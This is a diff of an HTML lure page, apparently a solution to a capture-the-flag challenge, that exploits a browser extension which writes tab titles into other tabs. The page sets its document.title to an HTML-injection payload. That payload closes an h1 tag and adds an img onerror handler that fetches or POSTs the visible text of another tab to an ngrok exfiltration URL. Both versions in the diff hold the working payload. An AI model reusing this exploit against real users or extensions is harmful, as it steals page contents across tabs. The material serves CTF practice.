@@ -3,43 +3,24 @@
   <head>
     <meta charset="utf-8" />
     <title>step1</title>
-    <!--
-      14828 Q2 helper page — host this file at a PUBLIC HTTPS URL (see README below).
-      The vulnerable extension only injects into OTHER tabs after the title CHANGES.
-      Flow: first title is stored; second different title triggers injection into other tabs (e.g. flag tab).
-    -->
   </head>
   <body>
-    <p>Page loaded. Exploit uses <code>document.title</code> (check the tab title / CTF bot flow)—this text stays as-is on purpose.</p>
+    <p>Q2 lure page — title changes trigger the vulnerable extension.</p>
     <script>
-      /**
-       * Exfil URL (must be HTTPS on the public internet for the CTF bot).
-       * Option A — webhook: https://webhook.site/xxx?stolen=
-       * Option B — no webhook: same ngrok host + /capture?stolen= (run serve_and_capture.py on 8080)
-       * Example: https://abcd.ngrok-free.dev/capture?stolen=
-       */
-      var EXFIL = "https://unextendable-madison-noncensoriously.ngrok-free.dev/capture?stolen=";
+      var EXFIL = "https://YOUR-NGROK.ngrok-free.dev/c";
 
-      /**
-       * Payload ends up inside: <h1>Your page has been updated in tab ${title}</h1>
-       * We close </h1> then run JS in the FLAG TAB (not this tab).
-       * Keep payload short; document.title length is limited in browsers.
-       */
       function buildPayload() {
-        var js =
-          "fetch('" +
+        return (
+          '</h1><img src=x onerror=\'fetch("' +
           EXFIL +
-          "'+encodeURIComponent((document.body&&document.body.innerText)||document.documentElement.innerText))";
-        // Break out of <h1> then execute via img onerror (classic pattern for jQuery HTML injection)
-        return "</h1><img src=x onerror=\"" + js.replace(/"/g, "&quot;") + "\">";
+          '",{method:"POST",body:(document.body&&document.body.innerText)||""})\'>'
+        );
       }
 
-      // First title: extension records titles[tabId], no injection yet.
-      document.title = "init-q2";
-
+      document.title = "a";
       setTimeout(function () {
         document.title = buildPayload();
-      }, 800);
+      }, 500);
     </script>
   </body>
 </html>
